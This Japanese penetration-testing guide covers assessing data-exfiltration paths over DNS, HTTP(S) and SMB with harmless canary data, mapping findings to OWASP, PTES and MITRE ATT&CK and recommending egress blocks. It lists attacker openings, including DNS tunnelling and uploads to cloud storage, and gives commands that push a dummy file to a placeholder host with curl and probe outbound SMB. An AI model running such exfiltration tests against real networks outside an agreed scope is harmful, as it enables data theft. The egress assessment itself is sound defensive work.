# 28_exfiltration_持ち出し経路（DNS_HTTP_SMB）

## 前提知識（最低限）
- DNS/HTTP/SMBの経路差

## 簡潔版（要点）
- 許可経路と検知点を最優先で固定する
持ち出し経路：DNS/HTTP(S)/SMB の“通る/止まる/監視できる”を観測で確定し、封じ方まで落とす（無害データで検証）。

## 目的（この技術で到達する状態）
- 対象ネットワーク（オンプレ/VPN/VDI/クラウド）で以下を **Yes/No/Unknown** で断言できる  
  1) DNS：どのResolver経由か、UDP/TCP/DoT/DoHが通るか、ログが残るか  
  2) HTTP(S)：プロキシ必須か、認証要否、TLS検査/DLP有無、許可先の制限  
  3) SMB：Outbound 445 が遮断されているか（例外管理はあるか）、内部共有は監査できるか  
  4) 監視：DNS/Proxy/Firewall/EDR のどこで、どの相関キー（ホスト/ユーザ/宛先/量/時間）で追えるか  
  5) 是正：Filter/Proxy/DLP/例外管理/棚卸しを設計として提示できる

> 本ファイルは「評価・封じ方・検知」が主。持ち出し“手口の高度化（トンネリング/難読化/回避）”は扱わない。検証は必ず合意済みの範囲で、無害データ（Canary/ダミー）で行う。

## 前提（対象・範囲・想定）
- 対象：社内クライアント/サーバから外部/内部へのDNS・HTTP(S)・SMB通信
- 想定環境：プロキシ/EDR/Firewall/DNSログが存在する前提
- できること/やらないこと：検証用ドメイン/サーバのみ使用。第三者宛は禁止。ダミーデータのみ使用
- 依存知識：基本的なDNS/HTTP(S)/SMB動作とログ項目
- 扱う範囲：出口制御・監査・是正
- 扱わない（別ユニット）：侵入/横展開 → `18_winrm...` `19_rdp...` `09_smb_enum...`、資格情報奪取 → `26_credential_dumping...`、永続化 → `27_persistence...`

## 観測ポイント（プロトコル/データ/境界）
- DNS：Resolver固定/直53可否、DoH/DoT許可、ログ（ClientIP/QueryName/Type/ResponseCode）
- HTTP(S)：プロキシ要否、認証、TLS検査/DLP有無、許可先FQDN/カテゴリ、サイズ/レート制御
- SMB：Outbound 445 遮断、内部共有の書込み可否、アクセス監査
- 境界：到達性・制御・検査・監査・例外運用（境界1〜5）
- 重要差分：プロキシバイパス、DoH/DoT隠れ経路、SMB例外、ログの相関キー有無

## 結果の意味（言える/言えない）
- 確定できる：DNS/HTTP(S)/SMB が通る/止まる、必要な経路（プロキシ/Resolver）、ログ有無
- 推定できる：例外運用が恒久化している可能性、検知の強さ/弱さ
- 言えない：業務上の例外正当性（担当確認が必要）、高度トンネリングの可否
- 状態パターン
  - A：直53遮断＋プロキシ強制＋Outbound SMB遮断（理想）
  - B：直53通過/Direct443許可/SMB例外あり（高リスク）
  - C：ログ相関不可（検知設計の欠落）

## 攻撃者視点での利用（意思決定）
- 狙い目：直53許可、Direct-to-Internet、プロキシ未認証、Outbound SMB例外、DoH/DoT許可
- 優先度：1) 到達性 2) 制御点（プロキシ/Resolver/SMB遮断） 3) 検査（TLS/DLP） 4) 監査と相関キー
- 代表的な攻め筋
  - DNSトンネリング余地の確認（長いTXT/高頻度）
  - 認証なしHTTP(S)でのアップロード、許可クラウドストレージ利用
  - SMB例外経由での横持ち出し
- 戦略変更：見えない経路が無い場合は内部横展開/クラウド側経路を再検討

## 次に試すこと（仮説A/Bの分岐と検証）
- 仮説A：直53が通る  
  - 次の検証：`nslookup example.com 8.8.8.8`（成功/失敗）  
  - 期待：成功なら遮断/ログ設計を提案、失敗なら内部Resolver固定を確認
- 仮説B：プロキシバイパスが可能  
  - 次の検証：`curl -I https://<TEST_FQDN>/`（直アクセス）、`netsh winhttp show proxy`  
  - 期待：直アクセス成功ならDirect経路あり、失敗でプロキシ必須を確認
- 仮説C：Outbound 445 が許可されている  
  - 次の検証：`Test-NetConnection -ComputerName <TEST> -Port 445`  
  - 期待：Trueなら例外の根拠/範囲/監査を要確認、Falseなら設計通り

## 手を動かす検証（Labs連動：観測点を明確に）
- 証跡ディレクトリ
~~~~
mkdir %USERPROFILE%\\keda_evidence\\exfil_28 2>nul
cd /d %USERPROFILE%\\keda_evidence\\exfil_28
~~~~
- 検証前提を固定：外部宛先は自社検証ドメイン/サーバのみ、ダミーデータのみ、許可時間帯で実施、Blueに観測ログを共有
- 相関キー：{Host, User, Time, Destination(FQDN/IP/Port), Protocol, Bytes, Identifier}
- ダミーデータ生成
~~~~
echo KEDA-EXFIL-28-%COMPUTERNAME%-%DATE%-%TIME%> canary.txt
for /l %i in (1,1,200) do @echo KEDA-DATA-%i>> canary.txt
dir canary.txt > canary_meta.txt
~~~~
- DNS
~~~~
ipconfig /all > ipconfig_all.txt
powershell -NoProfile -Command "Get-DnsClientServerAddress -AddressFamily IPv4 | Format-List | Out-File -Encoding UTF8 dns_client_serveraddress.txt"
nslookup example.com 8.8.8.8 > dns_nslookup_direct_8.8.8.8.txt 2>&1
nslookup keda-exfil-28-test.example.invalid > dns_nslookup_invalid.txt 2>&1
~~~~
- HTTP(S)
~~~~
netsh winhttp show proxy > winhttp_proxy.txt 2>&1
powershell -NoProfile -Command "[System.Net.WebRequest]::DefaultWebProxy | Out-String | Out-File -Encoding UTF8 dotnet_default_proxy.txt"
curl -I https://<YOUR_TEST_FQDN>/ > http_head_test.txt 2>&1
fsutil file createnew dummy_1mb.bin 1048576 > nul
curl -T dummy_1mb.bin https://<YOUR_TEST_FQDN>/upload/dummy_1mb.bin > http_upload_1mb.txt 2>&1
~~~~
- SMB
~~~~
powershell -NoProfile -Command "Test-NetConnection -ComputerName <YOUR_TEST_IP_OR_FQDN> -Port 445 | Out-File -Encoding UTF8 smb_outbound_445_test.txt"
net view \\\\<FILESERVER> > smb_netview.txt 2>&1
dir \\\\<FILESERVER>\\<SHARE>\\ > smb_share_dir.txt 2>&1
~~~~

## コマンド/リクエスト例（例示は最小限）
- DNS：`nslookup example.com 8.8.8.8`（直53可否）、`nslookup example.com`（内部Resolver経由とログ有無）
- HTTP(S)：`netsh winhttp show proxy`（プロキシ必須判定）、`curl -I https://<TEST>`（直443可否）、`curl -T dummy_1mb.bin ...`（サイズ制御/DLP確認）
- SMB：`Test-NetConnection -Port 445`（Outbound可否）、`net view`/`dir`（内部共有棚卸し）
- 使えないケース：検証用宛先が準備できない場合、DLP/Proxyがアップロードを拒否する場合（事前合意が必要）

## ガイドライン対応（ASVS / WSTG / PTES / MITRE ATT&CK）
- ASVS  
  - 破れる：Egress制御が弱く、DNS/HTTP(S)/SMB が業務理由で開放され持ち出しが成立する。  
  - 満たす：Egress制御（許可先/プロトコル/認証付きプロキシ/直53遮断/Outbound 445遮断）＋監査（相関可能なログ）＋例外の変更管理。  
  - 参照：https://github.com/OWASP/ASVS
- WSTG  
  - WSTG-CONF（構成・運用）：DNS/Proxy/Firewall の設計と監査が弱いとアプリ修正後もデータが抜け続ける。  
  - 参照：https://owasp.org/www-project-web-security-testing-guide/
- PTES  
  - Post-Exploitation / Exfiltration：経路棚卸し → 成立条件（許可/例外/認証/暗号/検査）→ 無害データで疎通確認 → ログ確認 → 封じ方まで。  
  - 参照：https://pentest-standard.readthedocs.io/
- MITRE ATT&CK  
  - Exfiltration Over Alternative Protocol（T1048/T1048.003）  
  - Application Layer Protocol（T1071/T1071.004 DNS / T1071.001 Web）  
  - Exfiltration Over Web Service（T1567/T1567.002/T1567.001）  
  - Detection：DET0570（Cloud Storageへの持ち出し検知の相関例）  
  - 参照：https://attack.mitre.org/
- SMB封じ方一次情報：Block outbound SMB 445  
  - https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-secure-traffic

## 参考（必要最小限）
- MITRE ATT&CK：T1048/T1048.003, T1071/T1071.004, T1567/T1567.002/T1567.001  
  https://attack.mitre.org/techniques/T1048/  
  https://attack.mitre.org/techniques/T1048/003/  
  https://attack.mitre.org/techniques/T1071/004/  
  https://attack.mitre.org/techniques/T1567/  
  https://attack.mitre.org/techniques/T1567/002/  
  https://attack.mitre.org/techniques/T1567/001/
- MITRE Detection Strategy DET0570  
  https://attack.mitre.org/detectionstrategies/DET0570/
- Microsoft Learn：Secure SMB Traffic（Outbound 445遮断）  
  https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-secure-traffic
- CISA StopRansomware（SMB 445遮断）  
  https://www.cisa.gov/stopransomware/ransomware-guide
- RFC 1035（DNSサイズ制限）  
  https://betterfc.org/rfc1035.html
- PTES：https://pentest-standard.readthedocs.io/
- OWASP ASVS：https://github.com/OWASP/ASVS
- OWASP WSTG：https://owasp.org/www-project-web-security-testing-guide/

## リポジトリ内リンク（最大3つまで）
- 関連 topics：`05_scanning_到達性把握（nmap_masscan）.md`
- 関連 playbooks：なし
- 関連 labs / cases：任意

---

## 深掘りリンク（最大8）
- `05_scanning_到達性把握（nmap_masscan）.md`
- `07_pivot_tunneling（ssh_socks_chisel）.md`
- `09_smb_enum_共有・権限・匿名（null_session）.md`
- `18_winrm_psremoting_到達性と権限.md`
- `19_rdp_設定と認証（NLA）.md`
- `20_mssql_横展開（xp_cmdshell_linkedserver）.md`
- `26_credential_dumping_所在（LSA_DPAPI）.md`
- `27_persistence_永続化（schtasks_services_wmi）.md`
